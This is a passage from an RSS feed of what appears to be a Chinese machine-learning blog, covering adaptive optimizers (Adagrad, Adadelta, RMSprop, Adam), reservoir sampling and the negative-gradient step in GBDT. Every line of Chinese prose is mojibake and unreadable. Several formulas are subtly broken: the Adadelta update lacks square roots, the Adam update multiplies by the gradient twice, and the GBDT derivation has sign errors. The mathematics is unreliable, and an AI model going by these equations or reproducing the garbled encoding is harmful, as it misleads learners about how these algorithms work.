å…¶ä¸­$G$æ˜¯ä¸€ä¸ªä¸»å¯¹è§’çŸ©é˜µï¼Œ$G_{ii}$è¡¨ç¤ºå‚æ•°çš„ç¬¬iä¸ªåˆ†é‡åœ¨tä¹‹å‰çš„æ¢¯åº¦å¹³æ–¹å’Œã€‚å½“$G_{ii}$è¾ƒå°çš„æ—¶å€™ï¼Œå³ä¹‹å‰æ¢¯åº¦å˜æ¢è¾ƒå°‘çš„ç‰¹å¾ï¼Œä¼šé€æ¸å¢åŠ å…¶æ­¥é•¿ï¼Œåä¹‹å‡å°‘æ­¥é•¿ã€‚
Adagradçš„ä¼˜åŠ¿æ˜¯å…å»äº†è¶…å‚æ•°$\eta$çš„è°ƒèŠ‚ï¼Œåœ¨ç»éªŒæƒ…å†µä¸‹$\eta=0.01$
ä½†æ˜¯åœ¨åˆ†æ¯ä¸æ–­ç§¯ç´¯çš„è¿‡ç¨‹ä¸­ï¼Œå…¶å­¦ä¹ ç‡å°±ä¼šæ”¶ç¼©ï¼Œæœ€ç»ˆå˜å¾—éå¸¸å°ã€‚
Adadelta Adadeltaå¯¹Adagradçš„é—®é¢˜è¿›è¡Œäº†æ”¹è¿›ï¼Œå°†åˆ†æ¯è½¬å˜ä¸ºæ¢¯åº¦çš„å‡æ–¹æ ¹ï¼Œè¿™æ ·å¾—åˆ°çš„å°±æ˜¯æ›´æ–°è¿‡ç¨‹ä¸­æƒé‡çš„å¹³å‡å˜åŒ–ã€‚åŒæ—¶æŠŠå­¦ä¹ ç‡$\eta$æ¢æˆäº†æ¢¯åº¦å€¼å¢é‡çš„å‡æ–¹æ ¹ï¼Œæ‰€ä»¥ä¹Ÿä¸ç”¨è®¾ç½®å­¦ä¹ ç‡äº†ã€‚å¯¹äºå‡æ–¹æ ¹çš„æ›´æ–°ï¼Œå®ƒè®¾å®šä¸ºï¼š
$$E[g^2]t=\gamma E[g^2]{t-1}+(1-\gamma)g_t^2$$
æƒé‡æ›´æ–°è¡¨ç¤ºä¸ºï¼š
$$\Delta \theta_t=-\frac{E[\Delta\theta^2]_{t-1}}{E[g^2]_t}$$
ä¸€èˆ¬æŠŠ$\gamma=0.9$
RMSprop RMSpropè¡¨ç¤ºä¸ºï¼š
$$v_t=\gamma v_{t-1}+(1-\gamma)g_t^2$$
$$\Delta w_t=-\frac{\eta}{\sqrt{v_t+\epsilon}}g_t$$
æ³¨æ„åˆ°è¿™é‡Œè®¡ç®—æ–°çš„æ¢¯åº¦å˜åŒ–é‡çš„æ—¶å€™ä½¿ç”¨äº†å¹³æ–¹ï¼Œå½“æ¢¯åº¦æœä¸åŒæ–¹å‘åŠ¨è¡çš„æ—¶å€™ï¼Œè¿™ä¸ªå€¼ä¸€ç›´ä¼šä¿æŒå¾ˆå¤§ï¼Œç›¸å½“äºè€ƒè™‘äº†å˜åŒ–çš„å¤§å°ï¼Œè€Œä¸åŠ¨è¡çš„æ¢¯åº¦æ–¹å‘å°±ä¼šäº§ç”Ÿå¾ˆå°çš„å€¼ã€‚è¿™åœ¨è®¡ç®—æƒé‡æ”¹å˜å€¼çš„æ—¶å€™èƒ½å‘æŒ¥ä½œç”¨ï¼Œå½“ä¸€ä¸ªæ¢¯åº¦å˜åŒ–åŠ¨è¡çš„æ—¶å€™åˆ†æ¯å€¼ä¼šå¾ˆå¤§ï¼Œå¯¼è‡´æƒé‡å˜åŒ–å°±å‡å°‘äº†ï¼Œå°±å‡å°‘äº†è¯¥æ–¹å‘çš„åŠ¨è¡ç¨‹åº¦ã€‚
Adam Adamç»“åˆäº†RMSpropå’ŒMomentumã€‚RMSpropå‡å¼±äº†åœ¨éœ‡è¡æ–¹å‘ä¸Šçš„æ¢¯åº¦å˜æ¢ï¼Œä½†æ˜¯é™ä½äº†è¯¥æ–¹å‘çš„æœç´¢èƒ½åŠ›ï¼›Momentumåˆ™å¾ˆå¥½çš„ç´¯ç§¯äº†ä¹‹å‰çš„æ¢¯åº¦å˜æ¢ï¼Œåœ¨æ¢¯åº¦æ–¹å‘å˜æ¢ä¸å¤§çš„æƒ…å†µä¸‹èƒ½ä¿ƒä½¿æ¢¯åº¦å¾€æ›´ä¼˜çš„æ–¹å‘å˜åŒ–ã€‚Adamç»¼åˆäº†è¿™ä¸¤è€…çš„ç‰¹æ€§ï¼Œæœ‰å¦‚ä¸‹çš„å®šä¹‰ï¼š
$$v_t=\beta_1 v_{t-1}+(1-\beta_1)*g_t$$
$$s_t=\beta_2 s_{t-1}+(1-\beta_2)*g_t^2$$
$$\Delta w_t=-\eta \frac{v_t}{\sqrt{s_t+\epsilon}}*g_t$$</description>
    </item>
    
    <item>
      <title>è“„æ°´æ± ç®—æ³•</title>
      <link>https://hagemon.github.io/posts/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</link>
      <pubDate>Fri, 23 Aug 2019 11:47:27 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</guid>
      <description>åœ¨é•¿åº¦æœªçŸ¥çš„æ•°æ®æµä¸­ï¼Œè¦å¦‚ä½•é‡‡æ ·kä¸ªæ ·æœ¬ï¼Œä½¿å¾—è¿™kä¸ªæ ·æœ¬è¢«é‡‡æ ·çš„æ¦‚ç‡æ˜¯ç›¸åŒçš„ï¼Ÿ
é¢è¯•ä¸­è¢«é—®åˆ°çš„ä¸€ä¸ªé—®é¢˜ï¼Œå½“æ—¶æ²¡æœ‰å¾ˆå¥½åœ°ç†è§£é¢˜ç›®ã€‚ä»”ç»†ä¸€æƒ³è¿™ä¸ªé—®é¢˜çš„åº”ç”¨è¿˜æ˜¯å¾ˆå¹¿æ³›çš„ï¼Œæ¯”å¦‚è¦åœ¨å¤§é‡çº§çš„ç‚¹å‡»äº‹ä»¶æ•°æ®æµä¸­é‡‡æ ·ç‚¹å‡»äº‹ä»¶ï¼Œä»è€Œä»äº‹ä»¶ä¸­è·å¾—ä¸€äº›ç‰¹å¾ï¼Œé‚£ä¹ˆä¸ºäº†ä¿è¯é‡‡æ ·çš„å…¬å¹³æ€§ï¼Œä½¿å¾—è·å¾—çš„ç‰¹å¾æ›´åŠ å®¢è§‚ï¼Œå°±éœ€è¦é‡‡æ ·æ—¶æ‰€æœ‰çš„æ ·æœ¬è¢«è·å–çš„æ¦‚ç‡æ˜¯ä¸€æ ·çš„ã€‚
é—®é¢˜æè¿° è®¾å®šä¸€ä¸ªé•¿åº¦ä¸ºkçš„æ•°ç»„ï¼Œç›®çš„æ˜¯ä¸ºäº†ä¿è¯è¿™kä¸ªæ•°æ®åœ¨æ•°æ®æµä¸æ–­æµå…¥çš„æƒ…å†µä¸‹ï¼Œä»–ä»¬è¢«é€‰ä¸­åˆ°è¿™ä¸ªæ•°ç»„é‡Œçš„æ¦‚ç‡æ˜¯ä¸€æ ·çš„ã€‚
å¯¹äºå‰kä¸ªæµå…¥çš„æ•°æ®ï¼Œéƒ½ä¼šè¢«ç›´æ¥é€‰ä¸­ï¼Œæ‰€ä»¥ç›´æ¥æ”¾åˆ°æ•°ç»„é‡Œï¼Œå®ƒä»¬çš„æ¦‚ç‡æ˜¯1ã€‚
ä¸ºäº†ä¿è¯æ•°æ®æµæŠ½æ ·çš„æ¦‚ç‡ç›¸ç­‰ï¼Œæ•°ç»„ä¸­çš„æ•°æ®éšæ—¶å¯èƒ½è¢«æ›¿æ¢ï¼Œå³æˆ‘ä»¬è¦ä¿è¯æ–°æ¥çš„æ•°æ®nè¢«é€‰ä¸­çš„æ¦‚ç‡å’Œæ± å­é‡Œçš„æ•°æ®ä¿ç•™çš„æ¦‚ç‡éƒ½æ˜¯$\frac{k}{n}$ã€‚
å¯¹äºå‰kä¸ªæ•°æ®ï¼Œä»–ä»¬åœ¨æ•°æ®é‡å°äºkæ—¶ä¼šä¸€ç›´å­˜åœ¨äºæ•°ç»„ä¸­ï¼Œè‹¥æ•°æ®é‡ä¸€æ—¦å¤§äºkï¼Œåˆ™å®ƒä»¬æœ‰å¯èƒ½è¢«æ›¿æ¢ã€‚å½“ç¬¬k+1ä¸ªæ•°æ®æµå…¥æ—¶ï¼Œæ–°æ•°æ®è¢«é‡‡æ ·åˆ°æ•°ç»„é‡Œçš„æ¦‚ç‡æ˜¯$\frac{k}{k+1}$ï¼Œè¿™ä¹Ÿæ˜¯ä¸€æ—¦æ•°ç»„ä¸­æŸä¸ªå…ƒç´ è¢«é€‰ä¸­ï¼Œå®ƒå°±ä»¥è¿™ä¸ªæ¦‚ç‡è¢«æ›¿æ¢ï¼›é‚£ä¹ˆæ•°ç»„ä¸­æŸä¸ªå…ƒç´ è¢«é€‰ä¸­çš„æ¦‚ç‡è‡ªç„¶æ˜¯$\frac{1}{k}$ï¼Œæ‰€ä»¥æŸä¸ªå…ƒç´ è¢«é€‰ä¸­ä¸”æ›¿æ¢çš„æ¦‚ç‡æ˜¯$\frac{1}{k}*\frac{k}{k+1}=\frac{1}{k+1}$ï¼Œåˆ™å®ƒç•™ä¸‹æ¥çš„æ¦‚ç‡æ˜¯$\frac{k}{k+1}$ã€‚åŒç†ï¼Œå½“ç¬¬k+2ä¸ªæ•°æ®æµå…¥æ—¶ï¼Œå®ƒè¢«ç•™ä¸‹æ¥çš„æ¦‚ç‡æ˜¯$\frac{k+1}{k+2}$ã€‚é‚£ä¹ˆå½“æœ‰nä¸ªæ•°æ®æµå…¥æ—¶ï¼Œå®ƒä¾ç„¶è¿˜åœ¨æ•°ç»„ä¸­çš„æ¦‚ç‡æ˜¯ï¼š
$$1*\frac{k}{k+1}\frac{k+1}{k+2}\cdots\frac{n-1}{n}=\frac{k}{n}$$
å¯¹äºkä¹‹åçš„æ•°æ®jï¼Œå®ƒè¢«é€‰ä¸­åˆ°æ•°ç»„é‡Œçš„æ¦‚ç‡æ˜¯$\frac{k}{j}$ï¼Œè‹¥å®ƒè¢«é€‰ä¸­äº†ï¼Œåˆ™å®ƒä¸è¢«ä¸‹ä¸€ä¸ªæ•°æ®æ›¿æ¢çš„æ¦‚ç‡æ˜¯$1-\frac{k}{j+1}*\frac{1}{k}=\frac{j}{j+1}$ï¼ŒåŒç†ï¼Œè‹¥å…¶æ²¡æœ‰è¢«æ›¿æ¢ï¼Œåˆ™ç¬¬j+2ä¸ªæ•°æ®æµå…¥æ—¶æ²¡æœ‰è¢«æ›¿æ¢çš„æ¦‚ç‡æ˜¯$\frac{j+1}{j+2}$ï¼Œé‚£ä¹ˆå®ƒè¢«ä¿ç•™çš„æ¦‚ç‡æ˜¯ï¼š
$$\frac{k}{j}\frac{j}{j+1}\cdots*\frac{n-1}{n}=\frac{k}{n}$$
æ‰€ä»¥æ‰€æœ‰æ•°æ®è¢«ä¿ç•™çš„æ¦‚ç‡éƒ½æ˜¯$\frac{k}{n}$ã€‚
å¯¹äºå®ç°æ¥è¯´ï¼Œå½“æœ‰ä¸€ä¸ªæ–°æ•°æ®æ—¶ï¼Œåœ¨å½“å‰æ•°æ®é•¿åº¦çš„èŒƒå›´å†…éšæœºé€‰æ‹©ä¸€ä¸ªæ•°mï¼Œè‹¥å®ƒå°äºç­‰äºkï¼Œåˆ™æ•°ç»„ä¸­mä½ç½®çš„æ•°å­—ä¼šè¢«æ–°æ•°å­—æ›¿æ¢ã€‚
å‚è€ƒèµ„æ–™ [ç”¨Pythonå†™ç®—æ³• | è“„æ°´æ± ç®—æ³•å®ç°éšæœºæŠ½æ ·](</description>
    </item>
    
    <item>
      <title>GBDTä¸­å¯¹äºæ¢¯åº¦æ‹Ÿåˆçš„ç†è§£</title>
      <link>https://hagemon.github.io/posts/gbdt%E4%B8%AD%E5%AF%B9%E4%BA%8E%E6%A2%AF%E5%BA%A6%E6%8B%9F%E5%90%88%E7%9A%84%E7%90%86%E8%A7%A3/</link>
      <pubDate>Tue, 20 Aug 2019 20:05:27 +0000</pubDate>
      
      <guid>https://hagemon.github.io/posts/gbdt%E4%B8%AD%E5%AF%B9%E4%BA%8E%E6%A2%AF%E5%BA%A6%E6%8B%9F%E5%90%88%E7%9A%84%E7%90%86%E8%A7%A3/</guid>
      <description>ä¸ºä»€ä¹ˆåœ¨ä¼˜åŒ–GBDTæ—¶ï¼Œè¦è®©å½“å‰çš„å­¦ä¹ å™¨å»æ‹Ÿåˆä¸€ä¸ªè´Ÿæ¢¯åº¦å‘¢ï¼Ÿ
åœ¨æ¢¯åº¦æå‡å†³ç­–æ ‘ï¼ˆGradient Boosting Decision Tree, GBDTï¼‰ä¸­ï¼Œå½“å‰å­¦ä¹ å™¨çš„æ‹Ÿåˆå¯¹è±¡æ˜¯è‡ªå®šä¹‰æŸå¤±å‡½æ•°$L(y_i,\hat{y}_i^{t-1})$å¯¹äºä¸Šä¸€ä¸ªå­¦ä¹ å™¨çš„è¾“å‡º$\hat{y}_i^{t-1}$çš„è´Ÿæ¢¯åº¦ï¼Œå³
$$-\frac{\partial{L(y_i,\hat{y}_i^{t-1})}}{\partial{\hat{y}_i^{t-1}}}$$
åœ¨è‡ªå®šä¹‰æŸå¤±å‡½æ•°ä¸ºå‡æ–¹è¯¯å·®å‡½æ•°æ—¶ï¼Œè¿™ä¸ªè´Ÿæ¢¯åº¦æ°å¥½æ˜¯å­¦ä¹ å™¨å’Œæ ‡ç­¾ä¹‹é—´çš„æ®‹å·®
$$-\frac{\partial{(y_i-\hat{y}_i^{t-1})^2}}{\partial{\hat{y}_i^{t-1}}}=2(y_i-\hat{y}_i^{t-1})$$
å¾ˆå¤šæ–‡ç« å¹¶æ²¡æœ‰å¯¹ä¸ºä»€ä¹ˆè¦æ‹Ÿåˆè´Ÿæ¢¯åº¦è¿™ä¸ªé—®é¢˜ç»™å‡ºä¸€ä¸ªè¯¦ç»†çš„è§£é‡Šï¼Œå¾ˆå¤šäººè§£é‡Šè¯´æ˜¯ä¸ºäº†èƒ½å¤Ÿåº”å¯¹è‡ªå®šä¹‰çš„æŸå¤±å‡½æ•°æ‰ä½¿ç”¨äº†è´Ÿæ¢¯åº¦æ¥ä»£æ›¿æ®‹å·®ã€‚ä½†æ˜¯å®é™…ä¸Šï¼Œæ°æ°æ˜¯å› ä¸ºä½¿ç”¨äº†è´Ÿæ¢¯åº¦æ¥æ‹Ÿåˆå½“å‰å­¦ä¹ å™¨çš„è¾“å‡ºï¼Œæ‰å¯¼è‡´äº†åœ¨ç‰¹æ®Šæƒ…å†µä¸‹ï¼ˆä½¿ç”¨å‡æ–¹è¯¯å·®ä½œä¸ºæŸå¤±å‡½æ•°çš„æƒ…å†µï¼‰ï¼Œå­¦ä¹ å™¨æ‹Ÿåˆçš„æ˜¯æ®‹å·®ã€‚
æ‰€ä»¥ä¸ºä»€ä¹ˆä½¿ç”¨çš„æ˜¯è´Ÿæ¢¯åº¦ï¼Œè€Œä¸æ˜¯åˆ«çš„ä»€ä¹ˆå€¼å‘¢ï¼Ÿä¸ªäººè§‰å¾—è¿™å’Œæ¢¯åº¦ä¸‹é™çš„åŸç†ååˆ†çš„ç±»ä¼¼ï¼Œæˆ‘ä»¬ä»æ¢¯åº¦ä¸‹é™å¼€å§‹è¯´èµ·ã€‚
æ¢¯åº¦ä¸‹é™æ³•çš„åŸç† åœ¨æˆ‘ä»¬æœ€æ—©æ¥è§¦çš„é«˜ç­‰æ•°å­¦é‡Œï¼Œå‡è®¾æœ‰ä¸€ä¸ªå›ºå®šå‚æ•°$\theta$çš„å‡½æ•°$f(x;\theta )=\theta_1 x^2+\theta_2x$ï¼Œæˆ‘ä»¬è¦æ±‚å¾—è¿™ä¸ªå‡½æ•°çš„æœ€å°å€¼ï¼Œåˆ™è¦å¯¹$f(x)$å…³äºå˜é‡$x$æ±‚å¯¼ï¼Œæ‰¾åˆ°å¯¼æ•°ä¸º0çš„ç‚¹ï¼Œå³åœ¨å˜é‡ç©ºé—´ä¸­æ‰¾åˆ°ä¸€ä¸ªå€¼ä½¿å¾—å‡½æ•°æœ€å°ã€‚
åæ¥æˆ‘ä»¬æ¥è§¦äº†æœºå™¨å­¦ä¹ ï¼Œæˆ‘ä»¬è¦æ±‚è§£çš„ç›®æ ‡ä»è‡ªå˜é‡$x$å˜æˆäº†æˆ‘ä»¬æ¨¡å‹çš„å‚æ•°$\theta$ï¼Œç›®çš„ä¹Ÿä»åœ¨å˜é‡ç©ºé—´ä¸­æ‰¾$x$å˜æˆäº†åœ¨å‚æ•°ç©ºé—´ä¸­æ‰¾åˆ°ä¸€ä¸ª$\theta$ï¼Œä½¿å¾—å¯¹äºæ‰€æœ‰çš„è®­ç»ƒæ•°æ®$x$ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°ï¼ˆä¹Ÿå°±æ˜¯æŸå¤±å‡½æ•°ï¼‰å€¼èƒ½æœ€å°ã€‚
æˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„ä¸€ä¸ªæ–¹æ³•å°±æ˜¯æ¢¯åº¦ä¸‹é™æ³•ï¼Œå®ƒçš„å½¢å¼ä¸ºï¼š
$$\theta_{t}=\theta_{t-1}-\eta\frac{\partial f(\theta_{t-1})}{\partial \theta_{t-1}}$$
æˆ‘åœ¨è¿™é‡Œå¢åŠ äº†ä¸€ä¸ªæ—¶é—´ä¸‹æ ‡ï¼Œä¸»è¦æ˜¯ä¸ºäº†åŒºåˆ†æ›´æ–°å‰åçš„$\theta$ã€‚
å…¶å®æ¢¯åº¦ä¸‹é™æ˜¯ç”±æ³°å‹’ä¸€é˜¶å±•å¼€æ¨å¯¼è€Œæ¥çš„ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥ä»å¯¼æ•°çš„å®šä¹‰æ¥è§£é‡Šï¼ˆè¿™é‡Œä»¥å•å˜é‡ä¸ºä¾‹ï¼Œæ‰€ä»¥æ˜¯å¯¼æ•°ï¼Œæ¨å¹¿åˆ°å¤šå˜é‡å°±å¯ä»¥å˜æˆæ¢¯åº¦ï¼‰
å‡è®¾å½“å‰çš„å‚æ•°ä¸º$\theta_{t-1}$ï¼Œæˆ‘ä»¬è¦æ±‚è§£çš„ä¸‹ä¸€ä¸ªå‚æ•°ä¸º$\theta_{t}$ï¼Œé‚£ä¹ˆå½“ä¸¤è€…ä¹‹é—´çš„è·ç¦»å¾ˆå°çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€šè¿‡å¯¼æ•°çš„æ¦‚å¿µå¾—å‡ºä»¥ä¸‹çš„å¼å­ï¼š
$$\frac{f(\theta_{t})-f(\theta_{t-1})}{\theta_{t}-\theta_{t-1}}= fâ€™(\theta_{t-1})$$
æ•´ç†ä¸€ä¸‹ï¼Œå¯å¾—
$$f(\theta_{t})-f(\theta_{t-1})=(\theta_{t}-\theta_{t-1})f&amp;rsquo;(\theta_{t-1})$$
å…¶å®è¿™ä¸ªå…¬å¼æ•´ç†ä¸€ä¸‹å°±æ˜¯æ³°å‹’ä¸€é˜¶å±•å¼€ï¼Œè¿™é‡Œçš„$(\theta_{t}-\theta_{t-1})$æ˜¯ä¸€ä¸ªå‘é‡ï¼Œè¡¨ç¤ºæˆ‘ä»¬çš„å‚æ•°å‘é‡ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒæ”¹å†™æˆæ ‡é‡*å•ä½å‘é‡çš„å½¢å¼ï¼š
$$(\theta_{t}-\theta_{t-1})=\eta e$$
æˆ‘ä»¬ä¼˜åŒ–çš„ç›®æ ‡æ˜¯è®©æ›´æ–°å‚æ•°åçš„å‡½æ•°å€¼æ¯”æ›´æ–°å‰çš„å‡½æ•°å€¼å°ï¼Œå³
$$f(\theta_{t})-f(\theta_{t-1})=\eta ef&amp;rsquo;(\theta_{t-1})&amp;lt;0$$
åœ¨ä¸è€ƒè™‘æ ‡é‡$\eta$æ—¶ï¼Œè¦ä½¿$ef&amp;rsquo;(\theta_t)$æœ€å°ï¼Œåˆ™éœ€è¦è®©å•ä½å‘é‡$e$å’Œå¯¼æ•°çš„æ–¹å‘ç›¸åï¼Œé‚£ä¹ˆåˆ™æœ‰
$$e=-\frac{f&amp;rsquo;(\theta_{t-1})}{||f&amp;rsquo;(\theta_{t-1})||}$$
å…¶ä¸­åˆ†æ¯å› ä¸ºæ˜¯æ ‡é‡ï¼Œå¯ä»¥å¹¶å…¥åˆ°$\eta$ä¸­ï¼Œåˆ™æœ‰
$\theta_{t}-\theta_{t-1}=\eta f&amp;rsquo;(\theta_{t-1})$
å³
$$\theta_{t}=\theta_{t-1}-\eta\frac{\partial f(\theta_{}t-1)}{\partial \theta_{t-1}}$$
GBDT ç°åœ¨è€ƒè™‘GBDTé‡Œçš„æƒ…å†µã€‚åœ¨æ¢¯åº¦ä¸‹é™æ³•ä¸­ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯ä¸ºäº†åœ¨å‚æ•°ç©ºé—´ä¸­æ‰¾åˆ°ä¸€ä¸ªå‚æ•°ï¼Œä½¿å¾—æŸå¤±å‡½æ•°æœ€å°ï¼›è€Œåœ¨GBDTä¸­ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯ä¸ºäº†åœ¨å‡½æ•°ç©ºé—´ï¼ˆä¹Ÿå°±æ˜¯æ‰€æœ‰å¯èƒ½çš„æ ‘åºåˆ—ç»„æˆçš„ç©ºé—´ï¼‰ä¸­ï¼Œæ‰¾åˆ°ä¸€ä¸ªå‡½æ•°ï¼ˆæŸä¸€ä¸ªæ ‘åºåˆ—ï¼‰ä½¿å¾—æŸå¤±å‡½æ•°ï¼ˆâ€œæ ‡ç­¾â€ä¸â€œæ ‘åºåˆ—è¾“å‡ºä¹‹å’Œâ€çš„å·®å¼‚ï¼‰æœ€å°ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠGBDTå’Œæ¢¯åº¦ä¸‹é™åšä¸€ä¸ªç±»æ¯”ã€‚
$f(\theta_{t})$å¯ä»¥ç±»æ¯”ä¸ºåŠ å…¥å½“å‰æ ‘ä¹‹åçš„æŸå¤±å‡½æ•°$l(y_i,\hat{y}i^{t-1}+T_t(x))$ ï¼Œ$f(\theta{t-1})$ç±»æ¯”ä¸ºä¹‹å‰çš„æŸå¤±å‡½æ•°$l(y_i,\hat{y}i^{t-1})$ï¼Œé‚£ä¹ˆæ¢¯åº¦ä¸‹é™ä¸­çš„å‚æ•°$\theta$å°±å¯ä»¥ç±»æ¯”ä¸ºGBDTä¸­ç´¯åŠ çš„å­¦ä¹ å™¨$F_m$,$\theta{t}$å’Œ$\theta_{t-1}$åˆ†åˆ«ç±»æ¯”ä¸ºåŠ å…¥å½“å‰æ ‘å’Œæ²¡åŠ å…¥å½“å‰æ ‘çš„ä¸¤ä¸ªå­¦ä¹ å™¨$F_m(x)$å’Œ$F_{m-1}(x)$ï¼Œä¸”æœ‰
$$F_{m-1}(x)-F_m(x)=T_t(x)$$
è¿™æ¬¡æˆ‘ä»¬ä»æ³°å‹’å±•å¼€çš„è§’åº¦æ¥è®²ï¼Œå…³äº$\hat{y}_i^{t-1}$çš„å‡½æ•°$l(y_i,\hat{y}_i^{t-1}+T_t(x))$åœ¨$T_t(x)$å¤„çš„æ³°å‹’ä¸€é˜¶å±•å¼€ä¸ºï¼š
$$l(y_i,\hat{y}_i^{t-1}+T_t(x))=l(y_i,\hat{y}i^{t-1})+(F{m-1}(x)-F_m(x))\frac{\partial l(y_i,\hat{y}_i^{t-1}+T_t(x))}{\partial \hat{y}_i^{t-1}}$$
è¿™ä¸ªå¼å­å…¶å®ä¹Ÿå¯ä»¥ç±»æ¯”ä¸Šä¸€èŠ‚ä¸­çš„å¼å­ï¼š
$$f(\theta_{t})-f(\theta_{t-1})=(\theta_{t}-\theta_{t-1})f&amp;rsquo;(\theta_{t-1})$$
å…¶å®äºŒè€…æ˜¯ä¸€æ ·çš„å½¢å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠæœ€ç»ˆæ¢¯åº¦ä¸‹é™çš„è¡¨è¾¾å¼æ”¹å†™æˆGBDTçš„å½¢å¼ï¼Œæœ‰å…´è¶£çš„è¯å¯ä»¥è‡ªå·±æ¨ä¸€éï¼Œå…¶å®å½¢å¼ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æ¢äº†ä¸ªç©ºé—´è€Œå·²ã€‚
$$F_{m}=F_{m-1}-\eta\frac{\partial l(y_i,\hat{y}_i^{t-1}+T_t(x))}{\partial \hat{y}_i^{t-1}}$$
å³
$$T_t(x)=-\eta\frac{\partial l(y_i,\hat{y}_i^{t-1}+T_t(x))}{\partial \hat{y}_i^{t-1}}$$
è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬è¦è®©æ–°çš„æ ‘å»æ‹Ÿåˆè´Ÿæ¢¯åº¦äº†ã€‚
Ending è¿™ä¹ˆä¸€æ€»ç»“ï¼Œå¤§èƒ†çŒœæµ‹XGBoostä½¿ç”¨äº†æ³°å‹’äºŒé˜¶å±•å¼€ï¼Œå¯èƒ½å°±æ˜¯å—äº†GBDTä¸­ä½¿ç”¨ä¸€é˜¶å±•å¼€çš„å¯å‘ã€‚ç»ˆäºæŠŠå¾ˆå¤šåšå®¢éƒ½æ²¡æœ‰è¯´çš„å¾ˆæ¸…æ¥šçš„éƒ¨åˆ†è®°å½•ä¸‹æ¥äº†ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå‚è€ƒäº†ä¸€äº›å†™çš„å¾ˆæ£’çš„åšå®¢å’ŒçŸ¥ä¹å›ç­”ï¼Œæ„Ÿè°¢å¤§å®¶çš„è¾›å‹¤ä»˜å‡ºï¼
å‚è€ƒèµ„æ–™ æ¢¯åº¦ä¸‹é™æ³•çš„æ¨å¯¼
gbdtçš„æ®‹å·®ä¸ºä»€ä¹ˆç”¨è´Ÿæ¢¯åº¦ä»£æ›¿ï¼Ÿ - å¥¥å¥¥å¥¥å¥¥å™¢åˆ©çš„å›ç­” - çŸ¥ä¹</description>
    </item>
    
  </channel>
</rss>
